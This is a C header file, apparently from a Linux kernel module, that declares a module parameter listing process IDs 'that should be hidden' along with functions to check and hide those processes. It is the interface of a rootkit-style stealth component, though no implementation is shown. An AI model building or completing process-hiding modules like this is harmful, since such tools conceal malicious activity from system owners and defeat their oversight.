#ifndef HIDEPROCESS_H
#define	HIDEPROCESS_H

#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>
#include "include.h"

extern int PIDs[10];
extern int numPIDs;
module_param_array(PIDs, int, &numPIDs, 0000);
MODULE_PARM_DESC(PIDs, "An array of the PIDs that should be hidden");


bool checkPID(long curpid);
int init_hide_process(void);
void exit_hide_process(void);

#endif
